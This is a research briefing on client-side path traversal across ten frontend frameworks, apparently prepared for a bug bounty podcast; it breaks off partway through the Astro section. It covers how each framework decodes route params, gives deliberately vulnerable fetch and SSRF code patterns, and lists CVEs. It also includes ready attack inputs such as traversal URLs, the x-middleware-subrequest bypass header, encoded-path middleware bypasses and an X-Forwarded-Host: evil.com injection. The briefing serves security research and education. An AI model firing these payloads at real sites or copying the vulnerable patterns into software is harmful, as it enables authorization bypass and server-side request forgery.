# Client-Side Path Traversal: Framework Deep Dive

**Prepared for:** Critical Thinking Bug Bounty Podcast (March 19, 2026)
**Topic:** CSPT Across Frontend Frameworks
**Date compiled:** 2026-03-06

---

## Executive Summary / Key Takeaways

**The core insight:** Every modern frontend framework decodes URL parameters before passing them to developer code. When those decoded params flow into `fetch()` calls, the browser normalizes `../` sequences *before* the HTTP request leaves — creating path traversal that bypasses server-side protections entirely.

**The three things that make CSPT universal:**
1. **No JavaScript encoding function encodes dots.** `encodeURIComponent('..') === '..'` — traversal survives all encoding.
2. **`fetch()` normalizes `../` before sending.** `fetch('/api/users/../../admin')` sends `GET /admin`. The browser does this, not the framework.
3. **Server-side rendering turns CSPT into SSRF.** Next.js Server Components, Remix loaders, SvelteKit `+page.server.ts`, Nuxt server routes — all execute `fetch()` on the server with internal credentials and network access.

**Framework-specific highlights:**
- **Vue Router v4** has the most exploitable encoding split: `route.params` delivers DECODED values while `route.path` stays encoded
- **Angular** splits URLs on literal `/` first, so `%2F` survives in paramMap — but `%2e%2e` still decodes to `..`
- **React Router** had a documented double-decode bug (Issue #10814) — `%252f` decoded through two pipeline stages to `/`
- **Next.js** CVE-2025-29927 lets you skip middleware entirely via `x-middleware-subrequest` header
- **Nuxt 3** has a real CSPT CVE (CVE-2025-59414) — stored CSPT via island payload revival
- **SvelteKit** CVE-2025-67647 exploits `decode_pathname()` vs `url.pathname` discrepancy for SSRF
- **Astro** CVE-2025-64765 — middleware bypass via URL encoding, then bypassed again with double-encoding
- **Catch-all/splat routes are the universal CSPT amplifier** — slashes pass through without encoding in every framework

---

## Quick Reference Matrix: Normalization Comparison

| Framework | Params decoded? | `%2f` → `/` in params? | `%2e%2e` → `..`? | Double-encode `%252f`? | Catch-all slashes? | Route breaks on `%2f`? |
|-----------|:-:|:-:|:-:|:-:|:-:|:-:|
| **React Router v7** | Yes (`decodeURIComponent`) | Yes (post-fix) | Yes | Yes (two-step pipeline) | Yes (`*` splat) | Yes (splits route) |
| **Next.js App Router** | Client: **re-encoded** / Server: Yes | Client: **No** (re-encoded) / Server: Yes | Yes | Version-dependent | Yes (`[...slug]` → array) | Yes for `[param]`, No for `[...param]` |
| **Remix** | Yes (inherits React Router) | Yes | Yes | Yes | Yes (`$.tsx` splat) | Yes |
| **Vue Router v4** | Yes (`route.params`) | Yes (decoded to `/`) | Yes | Not documented | Yes (`/:pathMatch(.*)*` → array) | Yes (splits route) |
| **Nuxt 3** | Yes | Yes (via Vue Router) | Yes | Version-dependent | Yes (inherits Vue Router) | Yes |
| **Angular** | Yes (`decodeURIComponent`) | **Yes** (EMPIRICALLY VERIFIED — decoded in paramMap) | Yes (`%2e%2e` → `..`) | Double-encodes on re-nav | N/A (no filesystem routing) | No (routing preserves, but paramMap decodes) |
| **SvelteKit** | Yes (version-dependent) | Historical double-decode bug | Yes | Yes (historical) | Yes (`[...rest]`) | Yes |
| **Ember.js** | Yes (`route-recognizer`) | Decoded → breaks route | Yes | Not documented | Yes (`/*path` wildcard) | Yes |
| **SolidStart** | **No** (EMPIRICALLY VERIFIED — no `decodeURIComponent` on params) | **No** (`%2F` stays encoded) | **No** (`%2E` stays encoded) | N/A | Yes (`[...path]`) | No (encoded chars stay in segment) |
| **Astro SSR** | Yes (`decodeURI`) | **No** (`decodeURI` preserves `/`) | Yes (letters decoded) | Yes (CVE bypass) | Yes (`[...slug]`) | Depends on adapter |
| **Astro SSG** | N/A (build-time) | N/A | N/A | N/A | N/A | N/A |

### Key Encoding Differences (The "Wow" Moments)

**Vue vs Angular — opposite encoding philosophies:**
- Vue: `route.params.productId` for URL `/product/..%2fadmin` = `"../admin"` (decoded, slashes real)
- Angular: `paramMap.get('productId')` for same URL = `"..%2fadmin"` (slash stays encoded)
- But Angular still decodes dots: `%2e%2e` → `..` (because dots need no encoding per RFC)

**Astro uses `decodeURI()` not `decodeURIComponent()`:**
- `decodeURI()` does NOT decode: `/ ? # & = + : ; @ [ ]`
- So `%2F` stays as `%2F` in Astro — but `%61` (encoded `a`) decodes
- This is why CVE-2025-64765 uses encoded letters (`/%61dmin`) not encoded slashes

**React Router's double-decode pipeline:**
- `matchRoutes()` calls `safelyDecodeURI()` (step 1)
- `matchPath()` calls `safelyDecodeURIComponent()` (step 2)
- Result: `%252f` → step 1 → `%2f` → step 2 → `/` — traversal through double-encoding

---

## Framework Deep Dives

---

### 1. React Router (v6 / v7)

#### Route Syntax
```jsx
// Dynamic segment
<Route path="users/:userId" element={<User />} />

// Optional segment
<Route path=":lang?/categories" element={<Categories />} />

// Splat / catch-all (captures across slashes - HIGHEST CSPT RISK)
<Route path="files/*" element={<FileExplorer />} />

// File-based (v7 framework mode, inherited from Remix)
// app/routes/users.$userId.tsx    → /users/:userId
// app/routes/files.$.tsx          → /files/*  (splat)
```

#### Parameter Extraction
```jsx
import { useParams } from "react-router";

function User() {
  const { userId } = useParams();
  // Post-fix (v6.20+/v7): userId is DECODED via decodeURIComponent
  // URL /profile/..%2F..%2Fadmin → userId = "../../admin"
}

// Splat access:
const { "*": splat } = useParams();
// URL /files/../../api/admin → splat = "../../api/admin"

// Data Router loader:
export async function loader({ params }) {
  // params.userId is decoded — same behavior
  return fetch(`/api/users/${params.userId}`);
}
```

#### URL Encoding / Normalization

**The double-decode bug (Issue #10814, fixed ~v6.20):**
1. `matchRoutes()` → `safelyDecodeURI(pathname)` — decodes non-reserved chars, preserves `/ ? # & = + : ; @`
2. `matchPath()` → `safelyDecodeURIComponent()` — decodes everything including `/`

Result: `%252f` → step 1 → `%2f` → step 2 → `/` (double-encode bypass worked)

**Current behavior (post-fix):** Standardized on `safelyDecodeURIComponent()` throughout. Params are fully decoded.

**`useLocation().pathname` vs `useParams()`:**
- `useLocation().pathname` = encoded URL (matches `window.location.pathname`)
- `useParams()` = decoded values
- Two different views of the same URL

**`generatePath` does NOT encode slashes:**
```javascript
generatePath('/a/:b/c', { b: '1/2' })
// Returns: '/a/1/2/c' — ambiguous! (Issue #11940)
```

#### CSPT Patterns

**Pattern 1: Param to fetch (textbook)**
```jsx
function Profile() {
  const { username } = useParams(); // decoded: "../../admin"
  useEffect(() => {
    fetch(`/api/users/${username}/profile`)
    // Browser normalizes: /api/users/../../admin/profile → /api/admin/profile
  }, [username]);
}
```

**Pattern 2: Splat route (maximum surface)**
```jsx
function FileViewer() {
  const { "*": filePath } = useParams();
  // /files/../../api/admin → filePath = "../../api/admin" (no encoding needed)
  fetch(`/api/content/${filePath}`) // → /api/admin
}
```

**Pattern 3: dangerouslySetInnerHTML chain (CSPT → XSS)**
```jsx
function BlogPost() {
  const { postId } = useParams();
  useEffect(() => {
    fetch(`/api/posts/${postId}`)
      .then(r => r.text())
      .then(setHtml);
  }, [postId]);
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // CSPT → attacker-controlled HTML → XSS
}
```

#### React Router CVEs

| CVE | CVSS | Description |
|-----|------|-------------|
| CVE-2025-31137 | 7.5 | X-Forwarded-Host path injection → cache poisoning DoS |
| CVE-2025-43864 | 8.2 | X-React-Router-SPA-Mode header → cache poison |
| CVE-2025-43865 | 8.2 | X-React-Router-Prerender-Data → data spoof |
| CVE-2025-68470 | TBD | Open redirect via unsafe navigation API |
| CVE-2026-22029 | TBD | XSS from loader/action redirect with untrusted input |
| CVE-2026-21884 | TBD | ScrollRestoration XSS via untrusted redirect |
| CVE-2026-22030 | TBD | CSRF via cross-origin form submissions to actions |
| CVE-2025-61686 | TBD | Path traversal in @react-router/node package |

---

### 2. Next.js (App Router + Pages Router)

#### Route Syntax
```
app/blog/[slug]/page.tsx           → /blog/:slug     (dynamic)
app/shop/[...slug]/page.tsx        → /shop/*          (catch-all, required)
app/shop/[[...slug]]/page.tsx      → /shop/*?         (catch-all, optional)
app/api/posts/[id]/route.ts        → Route Handler
```

Catch-all params return as arrays: `{ slug: ['a', 'b'] }` for `/shop/a/b`.

#### Parameter Extraction

**App Router (Next.js 15+ — params is a Promise):**
```tsx
export default async function Page({
  params,
}: {
  params: Promise<{ slug: string }>
}) {
  const { slug } = await params; // decoded
  const res = await fetch(`https://api.example.com/blog/${slug}`);
  // Server-side fetch — SSRF if slug contains traversal
}
```

**Client Component:**
```tsx
'use client'
import { useParams } from 'next/navigation'
const params = useParams<{ tag: string }>();
```

**Pages Router (getServerSideProps):**
```tsx
export async function getServerSideProps({ params }) {
  const { userId } = params; // decoded
  const data = await fetch(`${process.env.API_URL}/users/${userId}`);
  return { props: { user: await data.json() } };
}
```

#### URL Encoding / Normalization

**`%2f` in dynamic segments:** Typically 404s because decoded `/` splits the route. But in catch-all routes:
```
// app/shop/[...slug]/page.tsx
// URL: /shop/..%2f..%2fadmin → params: { slug: ['..', '..', 'admin'] }
// slug.join('/') → "../../admin" — traversal!
```

**Middleware URL normalization and `skipMiddlewareUrlNormalize`:**
With `skipMiddlewareUrlNormalize: true`, middleware receives un-normalized URLs:
```typescript
export function middleware(request: NextRequest) {
  if (request.nextUrl.pathname.startsWith('/admin')) {
    return NextResponse.redirect('/login');
  }
  // URL /%61dmin (encoded 'a') → pathname = "/%61dmin"
  // startsWith('/admin') = FALSE → bypass!
}
```

#### CVE-2025-29927 — Middleware Authorization Bypass (CRITICAL)

```http
GET /admin/dashboard HTTP/1.1
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

Next.js uses `x-middleware-subrequest` internally to prevent recursive middleware. If the header contains the middleware name repeated 5+ times, middleware is **skipped entirely**. Combined with CSPT: middleware-protected routes become accessible.

**Affected:** 11.1.4–13.5.6, 14.x < 14.2.25, 15.x < 15.2.3.

#### CSPT Patterns

**Pattern 1: Server Component SSRF (highest impact)**
```tsx
export default async function DocumentPage({ params }) {
  const { docId } = await params; // "../../admin/config"
  const doc = await fetch(`http://internal-service.local/docs/${docId}`, {
    headers: { 'X-Internal-Auth': process.env.INTERNAL_SERVICE_KEY },
  });
  return <div>{await doc.text()}</div>;
  // Attacker reads internal service with server credentials
}
```

**Pattern 2: Catch-all proxy (catastrophic)**
```tsx
// app/api/proxy/[...path]/route.ts
export async function GET(request, { params }) {
  const { path } = await params;
  const fullPath = path.join('/'); // ['..', '..', 'admin'] → '../../admin'
  return fetch(`https://backend.internal/${fullPath}`);
}
```

#### React2Shell (CVE-2025-55182 / CVE-2025-66478 — CVSS 10.0)

December 2025 — Critical RCE in React Server Components. The RSC Flight protocol's payload deserializer lacked `hasOwnProperty` check, allowing prototype chain traversal to `Function` constructor. Same architectural pattern as CSPT: untrusted input flows through framework internals to a dangerous sink.

**Affected:** Next.js 15.x/16.x App Router. Pages Router NOT affected.

#### Next.js CVEs

| CVE | CVSS | Description |
|-----|------|-------------|
| CVE-2025-55182 | 10.0 | React2Shell — RCE via RSC deserialization |
| CVE-2025-66478 | 10.0 | Downstream React2Shell in Next.js |
| CVE-2025-29927 | 9.1 | Middleware bypass via x-middleware-subrequest |
| CVE-2025-55183 | 5.3 | Server Function source code leakage |
| CVE-2025-55184 | 7.5 | DoS via crafted HTTP request |
| CVE-2020-5284 | N/A | `/_next/` directory traversal |

---

### 3. Remix

#### Route Syntax (Flat File-Based, v2)
```
routes/_index.tsx              → /
routes/users.$userId.tsx       → /users/:userId
routes/files.$.tsx             → /files/*        ($ alone = splat)
routes/users.($userId).tsx     → /users/:userId? (parens = optional)
routes/app.[sitemap.xml].tsx   → /app/sitemap.xml ([] escapes dots)
```

#### Parameter Extraction
```typescript
// routes/users.$userId.tsx
export async function loader({ params }: LoaderFunctionArgs) {
  const { userId } = params; // decoded
  return fetch(`${process.env.INTERNAL_API}/users/${userId}`);
}

// Splat: routes/files.$.tsx
export async function loader({ params }) {
  const filePath = params["*"]; // "../../api/secrets"
}

// Action (state-changing — CSPT2CSRF)
export async function action({ params, request }: ActionFunctionArgs) {
  const { userId } = params;
  await fetch(`/api/users/${userId}/settings`, { method: 'PUT', body: await request.formData() });
  // PUT /users/..%2f..%2fadmin/settings → PUT /api/admin/settings
}
```

#### URL Encoding / Normalization

Remix inherits React Router's pipeline entirely (merged in v7). All encoding behaviors from React Router apply.

**The `_data` parameter — unique Remix attack vector:**
```
GET /dashboard?_data=routes/dashboard
→ Returns loader data as JSON
```

Combined with X-Forwarded-Host injection (CVE-2025-31137):
```http
GET /page?_data=routes/admin.users HTTP/1.1
X-Forwarded-Host: evil.com:80/injected-path
```
Port field appended without sanitization → cache key manipulation → cache poisoning DoS.

#### CSPT Patterns

**Pattern 1: Loader SSRF**
```typescript
export async function loader({ params }) {
  const { docId } = params; // "../../admin/users"
  return fetch(`http://internal-microservice.cluster.local/documents/${docId}`, {
    headers: { 'X-Service-Auth': process.env.MICROSERVICE_SECRET },
  });
}
```

**Pattern 2: Nested param compounding**
```typescript
// routes/company.$companyId.user.$userId.tsx
export async function loader({ params }) {
  const { companyId, userId } = params;
  // Attack: /company/..%2f/user/..%2fadmin
  // companyId = "../", userId = "../admin"
  return fetch(`/api/company/${companyId}/user/${userId}`);
  // → /api/company/..//user/../admin → /api/user/admin
}
```

**Pattern 3: Splat as proxy (catastrophic)**
```typescript
// routes/proxy.$.tsx
export async function loader({ params }) {
  const path = params["*"]; // ANY path, fully decoded
  return fetch(`http://internal-service.local/${path}`);
  // Full SSRF — cloud metadata, K8s API, internal Redis
}
```

---

### 4. Vue Router v4

#### Route Syntax
```javascript
const routes = [
  { path: '/users/:id', component: UserProfile },
  { path: '/users/:id(\\d+)', component: UserProfile }, // regex constraint
  { path: '/files/:pathMatch(.*)*', component: FileExplorer }, // catch-all (array)
  { path: '/docs/:chapters+', component: Docs }, // one or more segments
  { path: '/:lang?/about', component: About }, // optional param
]
```

Catch-all `/:pathMatch(.*)*` returns params as an **array** — slashes are NOT encoded within the array.

#### Parameter Extraction
```javascript
// Composition API
import { useRoute } from 'vue-router'
const route = useRoute()
const userId = route.params.id   // DECODED
const fullPath = route.fullPath  // NOT decoded (browser-provided)
const path = route.path          // NOT decoded

// Options API
this.$route.params.id  // DECODED
```

**The critical encoding split:**
- `route.params` → **DECODED** (slashes and dots arrive decoded)
- `route.path` / `route.fullPath` → **NOT decoded** (browser-provided, stays encoded)

#### URL Encoding / Normalization (Key CSPT Differentiator)

**Vue Router is the most exploitable framework for CSPT because of the deliberate decode split.**

URL `/product/..%2f..%2fadmin`:
- `route.params.productId` = `"../../admin"` (decoded, with real slashes)
- `route.path` = `"/product/..%2f..%2fadmin"` (raw)

If you then do:
```javascript
const { data } = useFetch('/api/products/' + route.params.productId)
// fetch goes to /api/products/../../admin → /api/admin
```

**Known wontfix hash bug (Issue #2187):** `parseURL()` uses `decodeURIComponent` but `encodeHash()` uses `encodeURI` — `%2F` in hash fragments gets permanently decoded to `/` and can never be re-encoded.

**Issue #2953:** Maintainers confirmed slashes are URL separators and MUST be encoded, but `%2F` in a raw URL survives into params as decoded `/`.

**`router.push()` encoding asymmetry:**
```javascript
// String path — must be pre-encoded
router.push('/users/' + encodeURIComponent(userId))

// Params object — must be UNencoded (Vue encodes for you)
router.push({ name: 'user', params: { id: userId } })
```

#### CSPT Patterns

**Pattern 1: Composition API fetch**
```javascript
const route = useRoute()
// URL: /product/..%2f..%2fadmin
// route.params.productId = "../../admin" (decoded!)
const { data } = useFetch('/api/products/' + route.params.productId)
// fetch → /api/products/../../admin → /api/admin
```

**Pattern 2: Catch-all route (widest surface)**
```javascript
// Route: { path: '/files/:pathMatch(.*)*', ... }
// URL: /files/../../admin
// route.params.pathMatch = ['..', '..', 'admin'] (array with slashes split)
const path = route.params.pathMatch.join('/')
// path = "../../admin"
fetch('/api/files/' + path) // → /api/admin
```

**Pattern 3: Watch + fetch (reactive CSPT)**
```javascript
watch(() => route.params.id, async (newId) => {
  // Fires on every navigation — CSPT re-executes reactively
  const res = await fetch(`/api/items/${newId}`)
})
```

---

### 5. Nuxt 3

#### Route Syntax

Filesystem-based (Vue Router under the hood):
```
pages/users/[id].vue             → /users/:id
pages/users/[id]/index.vue       → /users/:id/
pages/[...slug].vue              → catch-all
pages/[[slug]].vue               → optional param
```

Server routes:
```
server/api/users/[id].ts         → /api/users/:id
server/api/[...].ts              → catch-all API
```

#### Parameter Extraction
```vue
<script setup>
// Client-side
const route = useRoute()
const id = route.params.id  // decoded (Vue Router behavior)

// Universal data fetching
const { data } = useFetch(`/api/users/${route.params.id}`)
// CSPT if id is traversal payload
</script>
```

```typescript
// Server route: server/api/users/[id].ts
export default defineEventHandler((event) => {
  const id = getRouterParam(event, 'id')  // H3's param extraction, decoded
  // Server-side — SSRF risk
  return $fetch(`http://internal-service/users/${id}`)
})
```

#### URL Encoding / Normalization

Inherits Vue Router's decoding behavior. `route.params` are decoded.

#### Real CVEs (Confirmed CSPT)

**CVE-2025-59414 (GHSA-p6jq-8vc4-79f6) — Stored CSPT via Island Payload Revival:**

`revive-payload.client.ts` deserializes `__nuxt_island` objects. The `key` field flows directly into `/__nuxt_island/${key}.json` without validation.

Attack: Inject `"key": "../../../../internal/service"` into prerendered page via attacker-controlled API endpoint.

Fixed with island key regex: `/^[a-z][a-z\d-]*_[a-z\d]+$/i`

**Affects:** >= 3.6.0 < 3.19.0 and >= 4.0.0 < 4.1.0

**This is the most dangerous pattern:** Not router param CSPT — it's **stored CSPT** where attacker-controlled data gets prerendered, then the client revival system fetches attacker-controlled paths.

| CVE | Description | Fixed in |
|-----|-------------|----------|
| CVE-2025-59414 | CSPT in island payload revival | 3.19.0 / 4.1.0 |
| CVE-2025-27415 | Cache poisoning DoS via payload route regex | 3.16.0 |
| CVE-2024-23657 | DevTools path traversal + missing WebSocket auth | Patched |
| CVE-2024-34344 | RCE via NuxtTestComponentWrapper path bypass | Patched |

---

### 6. Angular

#### Route Syntax
```typescript
const routes: Routes = [
  { path: 'users/:userId', component: UserComponent },
  { path: 'users/:userId/posts/:postId', component: PostComponent },
  { path: '**', component: NotFoundComponent },  // wildcard (last resort)
  // No catch-all with slash capture like [...]
];
```

Angular does NOT have filesystem routing or rest/catch-all params that capture slashes. The `**` wildcard matches any URL but doesn't provide sub-path params.

#### Parameter Extraction
```typescript
// Modern (Observable-based)
import { ActivatedRoute } from '@angular/router';

constructor(private route: ActivatedRoute) {
  this.route.paramMap.subscribe(params => {
    const userId = params.get('userId');  // recommended API
  });
}

// Snapshot (non-reactive)
const userId = this.route.snapshot.paramMap.get('userId');

// Functional guards (newer Angular)
export const userGuard: CanActivateFn = (route) => {
  const userId = route.paramMap.get('userId');
};
```

#### URL Encoding / Normalization (DIFFERENT from all other frameworks)

**Angular splits URLs on literal `/` FIRST, then processes segments.**

This means:
- `%2F` (encoded slash) in a typed URL **IS preserved** as `%2F` in `paramMap` — NOT decoded to `/`
- `%2e%2e` (encoded dots) **ARE decoded** to `..` because dots need no encoding per RFC 3986
- **Attack vector difference from Vue/React:** `%2e%2e/` (literal `../`) still traverses; `..%2f` may not because the slash doesn't decode before routing

**Double-encoding bug in `router.navigate()`:**
```typescript
// router.navigate() is NOT idempotent
// A path containing '%' gets double-encoded to '%25'
router.navigate(['/path', '%2Ftest'])
// URL becomes: /path/%252Ftest (double-encoded!)
```

**`routerLink` with encoded URLs causes double-encoding** because `createUrlTree` splits on `/` then re-encodes each segment (Issue #50950).

**`UrlSerializer` is the architectural encoding control point** — requires custom implementation for full control:
```typescript
@Injectable()
export class CustomUrlSerializer implements UrlSerializer {
  parse(url: string): UrlTree {
    // Custom decoding logic here
    return new DefaultUrlSerializer().parse(decodeURIComponent(url));
  }
  serialize(tree: UrlTree): string {
    return new DefaultUrlSerializer().serialize(tree);
  }
}
```

#### CSPT Patterns

**Pattern 1: HTTP client with paramMap**
```typescript
ngOnInit() {
  this.route.paramMap.subscribe(params => {
    const userId = params.get('userId');
    // For URL /users/..%2fadmin:
    // Angular preserves %2F → userId = "..%2fadmin" (NOT decoded slash)
    // BUT for /users/%2e%2e/admin:
    // Angular decodes dots → userId = ".." (in first segment)
    // Second segment becomes "admin" via normal routing

    this.http.get(`/api/users/${userId}/profile`).subscribe(data => {
      this.user = data;
    });
  });
}
```

**Pattern 2: Encoded dots traversal**
```typescript
// The Angular-specific attack:
// URL: /users/%2e%2e%2fadmin  ← dots encoded, slash literal
// paramMap gets: userId = ".." (dots decoded)
// But wait — the "/" after %2e%2e is a LITERAL separator
// So Angular routes to: /users/.. → which is /users (parent route)

// More realistic Angular CSPT:
// Multiple params: /org/:orgId/user/:userId
// Attack: /org/..%2f/user/..%2fadmin
// orgId gets "..%2f" (slash stays encoded in Angular!)
// So the fetch: /api/org/..%2f/user/../admin
// Browser resolves: /api/org/..%2f/user/../admin → /api/org/..%2f/admin
// Still partially traversed!
```

**Pattern 3: Query parameter CSPT (Angular's wider surface)**

Since Angular preserves `%2f` in path params, the bigger CSPT surface is actually **query parameters** and **programmatic navigation**:
```typescript
// query params are NOT encoded/decoded by Angular router
const searchTerm = this.route.snapshot.queryParamMap.get('q');
this.http.get(`/api/search/${searchTerm}`).subscribe(/* ... */);
// Attack: /search?q=../../admin
```

---

### 7. SvelteKit

#### Route Syntax

Filesystem-based under `src/routes/`:
```
src/routes/user/[id]/+page.svelte          → /user/:id
src/routes/[[lang]]/home/+page.svelte       → /home AND /en/home (optional)
src/routes/files/[...path]/+page.svelte     → /files/* (catch-all)
src/routes/smileys/[x+3a]-[x+29]/+page.svelte → /smileys/:-) (hex-encoded chars)
```

#### Parameter Extraction
```svelte
<script>
  import { page } from '$app/stores';
  // $page.params.id — decoded
</script>
```

```typescript
// Universal load (+page.ts)
export async function load({ params, fetch }) {
  const res = await fetch(`/api/users/${params.id}/profile`);
  return { user: await res.json() };
}

// Server load (+page.server.ts) — SSRF risk
export const load = async ({ params, fetch }) => {
  const doc = await fetch(`http://internal-service/documents/${params.id}`);
  return { doc: await doc.json() };
};
```

#### URL Encoding / Normalization

**The double-decode bug (Issue #3069):**
SvelteKit's `this.parse(url)` decodes the URL, then the route manifest calls `decodeURIComponent()` on the already-decoded value. Fixed in v1.0.0-next.385.

**Before fix:** Server-side rendering and client-side navigation received **different param values** for the same URL.

**`decode_pathname` vs `url.pathname` discrepancy (CVE-2025-67647):**
```
x-sveltekit-pathname: /prerendered-exampl%65
```
`decode_pathname()` decodes `resolved_path` while `url.pathname` stays encoded. The condition `resolved_path !== url.pathname` becomes true, triggering a fetch block that can be pointed at internal resources. Combined with Node adapter + prerendered routes + no ORIGIN env var = **full-read SSRF**.

**Server-side load vs client-side load encoding difference:**
The same URL may yield different `params.id` values depending on whether it loaded server-side or client-side (particularly with percent-encoded characters).

#### CSPT Patterns

**Pattern 1: Classic load() CSPT**
```typescript
// src/routes/user/[id]/+page.ts
export async function load({ params, fetch }) {
  // URL /user/..%2fadmin → params.id might be "../admin"
  const res = await fetch(`/api/users/${params.id}/profile`);
  // → /api/users/../../admin/profile → /api/admin/profile
  return { user: await res.json() };
}
```

**Pattern 2: Rest param (no encoding needed!)**
```typescript
// src/routes/files/[...path]/+page.ts
export async function load({ params, fetch }) {
  // /files/../../admin → params.path = "../../admin" (slashes already in param!)
  const res = await fetch(`/api/files/${params.path}`);
  // → /api/../../admin → /admin
  return { content: await res.text() };
}
```

**Pattern 3: hooks.server.ts bypass**
```typescript
export const handle = async ({ event, resolve }) => {
  if (!event.url.pathname.startsWith('/api/')) {
    return resolve(event); // Non-API — allow
  }
  if (!event.cookies.get('session')) {
    return new Response('Unauthorized', { status: 401 });
  }
  return resolve(event);
};
// The fetch inside a load function goes directly — NOT through this hook
// So CSPT from load() to /api/* bypasses this auth check
```

**Param matchers as defense:**
```typescript
// src/params/id.ts
export function match(param: string): boolean {
  if (param.includes('..') || param.includes('%2e') || param.includes('%2f')) {
    return false;
  }
  return /^[a-zA-Z0-9-_]+$/.test(param);
}
// Usage: src/routes/user/[id=id]/+page.svelte
```

#### SvelteKit CVEs

| CVE | Description | Affected | Fixed |
|-----|-------------|----------|-------|
| CVE-2025-67647 | SSRF + DoS via encoded pathname | 2.19.0-2.49.4 | 2.49.5 |
| CVE-2026-22803 | DoS via remote functions | 2.49.0-2.49.4 | 2.49.5 |
| CVE-2025-15265 | XSS via experimental hydratable | svelte 5.46.0-5.46.3 | 5.46.4 |

---

### 8. Ember.js

#### Route Syntax
```javascript
// app/router.js
Router.map(function() {
  this.route('user', { path: '/users/:user_id' });
  this.route('post', { path: '/posts/:post_id' }, function() {
    this.route('comment', { path: '/comments/:comment_id' });
  });
  this.route('not-found', { path: '/*path' }); // wildcard catch-all
});
```

Uses `:param` syntax (Rails convention). `*` wildcard captures remaining path including slashes.

#### Parameter Extraction
```javascript
// app/routes/user.js
export default class UserRoute extends Route {
  async model(params) {
    // params.user_id is decoded by route-recognizer
    return fetch(`/api/users/${params.user_id}`);
  }
}

// Via Router Service (modern Ember)
this.router.currentRoute.params.user_id

// Parent route params
const postParams = this.paramsFor('post');
```

#### URL Encoding / Normalization

**The serialize/model hook symmetry problem:**

`serialize` produces URLs from models; `model` parses URLs to models. The encoding bug (Issue #11497): if a model ID contains `/`, the default `serialize` produces `/users/abc/def` instead of `/users/abc%2Fdef`. Reload fails because `abc` fills `:user_id` and `def` becomes unmatched.

**route-recognizer fix:** Now calls `encodeURIComponent` on serialize, `decodeURIComponent` on recognize. But custom `serialize` hooks may omit encoding.

**`%2f` in Ember:** `route-recognizer` decodes `%2f` to `/` which **breaks route matching** (splits into multiple segments). So direct CSPT via `%2f` typically fails at the routing level.

**CSPT surface is primarily:**
1. Wildcard routes (`/*path`) — capture everything including decoded slashes
2. Query parameters — NOT encoded/decoded by Ember's router
3. Custom Ember Data adapters without `encodeURIComponent`

#### CSPT Patterns

**Pattern 1: Wildcard route (highest risk)**
```javascript
Router.map(function() {
  this.route('document', { path: '/docs/*doc_path' });
});
export default class DocumentRoute extends Route {
  model(params) {
    // /docs/../../admin → params.doc_path = "../../admin"
    return fetch(`/api/documents/${params.doc_path}`);
    // → /api/../../admin → /admin
  }
}
```

**Pattern 2: Ember Data adapter (Issue #3971)**
```javascript
export default class ApplicationAdapter extends RESTAdapter {
  urlForFindRecord(id, modelName) {
    return `/api/${modelName}s/${id}`;
    // Default implementation uses encodeURIComponent — but overrides don't!
    // id = "123/../../admin" → /api/users/123/../../admin
  }
}
```

**Hash routing CSPT difference:**
- Hash routes (`#/users/..%2fadmin`) never hit the server — fragment is client-only
- `HashLocation` calls `decodeURIComponent` on hash before routing
- Hash-based CSPT reaches `model()` in decoded form but only affects client-side fetches

---

### 9. SolidStart

#### Route Syntax

Filesystem-based under `src/routes/`:
```
src/routes/users/[id].tsx              → /users/:id
src/routes/files/[...path].tsx         → /files/* (catch-all)
src/routes/[[lang]]/home.tsx           → /home AND /en/home (optional)
```

#### Parameter Extraction
```tsx
import { useParams } from '@solidjs/router';
import { createResource } from 'solid-js';

export default function UserPage() {
  const params = useParams<{ id: string }>();
  // params is REACTIVE (solid.js reactivity)

  const [userData] = createResource(() => params.id,
    async (id) => {
      const res = await fetch(`/api/users/${id}`);  // CSPT
      return res.json();
    }
  );
}

// Server functions (v1.0+)
const getUser = query(async (id: string) => {
  'use server';
  // id arrives via JSON RPC — no re-encoding at boundary!
  const res = await fetch(`http://internal-api/users/${id}`);
  return res.json();
}, 'getUser');
```

#### URL Encoding / Normalization

solid-router decodes segments via `decodeURIComponent` before storing in params. `%2f` decodes to `/` which breaks regular route matching. But catch-all `[...path]` captures slashes.

**Server function encoding:** The path passes through JSON RPC unchanged — `../../admin` goes from client to server as-is. No re-encoding at the server function boundary. Server-side fetch performs traversal against internal services.

**Reactivity as security surface:** `createResource` re-executes when params change. CSPT fires on every navigation, not just page load. An attacker who can trigger navigation (malicious link, iframe postMessage) gets repeatable CSPT.

#### CSPT Patterns

**Pattern 1: createResource + useParams**
```tsx
const [product] = createResource(
  () => params.id,
  async (id) => {
    // /product/..%2f..%2fadmin → id = "../admin"
    const res = await fetch(`/api/products/${id}`);
    return res.json();
  }
);
```

**Pattern 2: Server function CSPT → SSRF**
```tsx
const getFile = query(async (id: string) => {
  'use server';
  // id = "../../internal-secret" — reaches internal services
  const res = await fetch(`http://10.0.0.1:8080/files/${id}`);
  return res.json();
}, 'getFile');
```

No known public CVEs for SolidStart specifically for CSPT. Framework is younger with smaller documented attack surface.

---

### 10. Astro

#### Route Syntax

Filesystem-based under `src/pages/`:
```
src/pages/users/[id].astro             → /users/:id
src/pages/docs/[...slug].astro         → /docs/* (catch-all)
src/pages/api/users/[id].ts            → API route
```

#### Parameter Extraction
```astro
---
// SSR mode
const { slug } = Astro.params;  // decoded by Astro's router

// API route
export const GET: APIRoute = async ({ params }) => {
  const { id } = params;  // decoded
};
---
```

**Critical SSG vs SSR difference:**
> "params returned by a getStaticPaths() function are not decoded" — Astro docs

- **SSG mode:** `params.slug` = raw value from `getStaticPaths()` — developer-controlled, no user input at request time
- **SSR mode:** `params.slug` = decoded from URL — user-controlled, full CSPT risk

#### URL Encoding / Normalization

**Astro uses `decodeURI()` not `decodeURIComponent()`:**
- `decodeURI()` does NOT decode: `! # $ & ' ( ) * + , / : ; = ? @ [ ]`
- So `%2F` stays as `%2F` — but `%61` (encoded `a`) IS decoded
- This is why CVE-2025-64765 uses encoded letters, not encoded slashes

#### CVE-2025-64765 — Middleware Authentication Bypass (Critical)

```
Request: GET /%61dmin HTTP/1.1    (%61 = 'a')
Middleware sees: context.url.pathname = "/%61dmin"
Router renders: /admin (decoded internally)

Result: middleware auth check FAILS to match, admin page IS served
```

**Bypass of the fix (GHSA-whqg-ppgf-wp8c) — double encoding:**
```
Request: GET /%2561dmin HTTP/1.1
Single decode: /%61dmin (still encoded, bypasses fixed middleware)
Double decode: /admin (router reaches this)
```

Recommended defense: after one decode, if `%xx` sequences remain, return 400.

#### CSPT Patterns

**Pattern 1: SSR route interpolation**
```astro
---
const { slug } = Astro.params;
